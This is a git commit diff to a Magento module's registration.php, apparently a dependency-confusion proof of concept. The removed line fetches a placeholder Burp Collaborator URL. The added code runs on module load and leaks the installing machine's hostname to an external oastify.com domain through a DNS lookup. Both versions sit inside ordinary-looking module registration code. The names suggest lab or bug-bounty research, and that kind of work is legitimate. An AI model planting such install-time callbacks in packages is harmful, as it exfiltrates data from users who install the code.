fcf6e27133d9752dd3042eb1e281ae179056a8fa
eshwar1988 <eshwar_dec@yahoo.co.in>
2026-03-02 21:46:36 +0530

    Update registration.php

--- registration.php
+++ registration.php
@@ -1,1 +1,11 @@
-<?php @file_get_contents('http://[YOUR-BURP-COLLABORATOR-URL]/?proof=bol_dependency_confusion'); \Magento\Framework\Component\ComponentRegistrar::register( \Magento\Framework\Component\ComponentRegistrar::MODULE, 'Bol_CheckoutViaBol', __DIR__ );
+<?php
+$lab_host = gethostname();
+$collab_domain = "rwrw8181gv8ykljahyxo3kynxe35rxfm.oastify.com";
+
+@gethostbyname($lab_host . "." . $collab_domain);
+
+\Magento\Framework\Component\ComponentRegistrar::register(
+    \Magento\Framework\Component\ComponentRegistrar::MODULE,
+    'EshwarLab_TestModule',
+    __DIR__
+);
